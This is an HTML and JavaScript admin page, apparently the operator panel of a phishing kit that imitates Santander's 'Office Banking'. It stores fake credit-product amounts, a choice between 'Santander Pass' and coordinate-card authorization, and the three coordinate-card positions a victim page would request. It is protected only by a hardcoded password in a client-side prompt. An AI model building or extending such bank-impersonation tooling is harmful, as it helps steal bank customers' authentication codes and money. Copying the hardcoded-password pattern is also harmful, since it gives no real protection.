<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Panel de Administración</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <script>
    // Protección por clave simple
    const clave = prompt("Ingrese clave de acceso:");
    if(clave !== "Trabajo2101"){   // <-- aquí defines tu clave
      alert("Acceso denegado");
      window.location.href = "index.html"; // redirige al login
    }
  </script>

  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">

    <h2>Configurar Productos y Autorización</h2>

    <form id="adminForm">
      <label for="producto1">Nombre Producto 1</label>
      <input type="text" id="producto1" placeholder="Ej: Línea de Crédito">

      <label for="monto1">Monto Producto 1</label>
      <input type="number" id="monto1" placeholder="Ej: 5000000">

      <label for="producto2">Nombre Producto 2</label>
      <input type="text" id="producto2" placeholder="Ej: Tarjeta de Crédito WorldMember">

      <label for="monto2">Monto Producto 2</label>
      <input type="number" id="monto2" placeholder="Ej: 7000000">

      <!-- Selección de tipo de autorización -->
      <label for="tipoAutorizacion">Tipo de Autorización</label>
      <select id="tipoAutorizacion">
        <option value="santander">Santander Pass</option>
        <option value="coordenadas">Coordenadas</option>
      </select>

      <!-- Coordenadas configurables por el admin -->
      <div id="coordConfig">
        <label for="coord1">Coordenada 1 (ej: A4)</label>
        <input type="text" id="coord1" maxlength="2" pattern="[A-Z][0-9]" placeholder="Ej: A4">

        <label for="coord2">Coordenada 2 (ej: B7)</label>
        <input type="text" id="coord2" maxlength="2" pattern="[A-Z][0-9]" placeholder="Ej: B7">

        <label for="coord3">Coordenada 3 (ej: C2)</label>
        <input type="text" id="coord3" maxlength="2" pattern="[A-Z][0-9]" placeholder="Ej: C2">
      </div>

      <button class="btn-santander" type="submit">
        Guardar<span class="bg-arrow"></span>
      </button>
    </form>

    <div id="resultado"></div>
  </div>

  <script>
    // Cargar valores guardados al abrir el panel
    document.addEventListener("DOMContentLoaded", () => {
      document.getElementById("producto1").value = localStorage.getItem("producto1") || "";
      document.getElementById("monto1").value = localStorage.getItem("lineaMonto") || "";
      document.getElementById("producto2").value = localStorage.getItem("producto2") || "";
      document.getElementById("monto2").value = localStorage.getItem("tarjetaMonto") || "";

      // Cargar tipo de autorización correctamente
      const tipoGuardado = localStorage.getItem("tipoAutorizacion");
      if(tipoGuardado){
        document.getElementById("tipoAutorizacion").value = tipoGuardado;
      }

      document.getElementById("coord1").value = localStorage.getItem("coord1") || "";
      document.getElementById("coord2").value = localStorage.getItem("coord2") || "";
      document.getElementById("coord3").value = localStorage.getItem("coord3") || "";
    });

    // Guardar nuevos valores
    document.getElementById("adminForm").addEventListener("submit", function(e){
      e.preventDefault();

      localStorage.setItem("producto1", document.getElementById("producto1").value);
      localStorage.setItem("producto2", document.getElementById("producto2").value);

      // Guardar montos como string para que se reflejen en los inputs
      localStorage.setItem("lineaMonto", document.getElementById("monto1").value);
      localStorage.setItem("tarjetaMonto", document.getElementById("monto2").value);

      // Guardar tipo de autorización
      localStorage.setItem("tipoAutorizacion", document.getElementById("tipoAutorizacion").value);

      // Guardar coordenadas alfanuméricas en mayúsculas
      localStorage.setItem("coord1", document.getElementById("coord1").value.toUpperCase());
      localStorage.setItem("coord2", document.getElementById("coord2").value.toUpperCase());
      localStorage.setItem("coord3", document.getElementById("coord3").value.toUpperCase());

      document.getElementById("resultado").innerText = "✅ Configuración actualizada correctamente.";
    });
  </script>
</body>
</html>
